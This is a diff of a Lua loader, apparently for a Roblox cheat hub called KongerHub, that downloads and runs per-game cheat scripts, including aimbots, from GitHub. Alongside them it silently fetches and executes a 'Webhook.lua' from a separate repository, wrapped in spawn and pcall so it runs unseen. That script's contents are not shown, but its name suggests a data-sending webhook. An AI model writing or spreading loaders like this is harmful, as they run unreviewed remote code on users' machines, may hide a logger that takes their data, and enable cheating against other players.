@@ -1,13 +1,15 @@
---[[
-    KongerHub Loader
-]]
-
-
 setfpscap(10000)
 
+local _game = game
+local Players = _game:GetService("Players")
+local HttpService = _game:GetService("HttpService")
+local CoreGui = _game:GetService("CoreGui")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/Webhook.lua"))()
-
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/Webhook.lua"))()
+    end)
+end)
 
 local gameLinks = {
     [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
@@ -22,11 +24,22 @@ local gameLinks = {
     [13864661000] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
     [13864667823] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
     [301549746] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/counterblox.lua",
-    
+    [17625359962] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [117398147513099] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [286090429] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [109397169461300] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [134784668468620] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [14518422161] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [109397169461300] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
+    [15514727567] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
 }
 
-if gameLinks[game.PlaceId] ~= nil then
-    loadstring(game:HttpGet(gameLinks[game.PlaceId]))()
+local scriptUrl = gameLinks[_game.PlaceId]
+
+if scriptUrl then
+    pcall(function()
+        loadstring(_game:HttpGet(scriptUrl))()
+    end)
 else
     warn("Not Supported")
 end
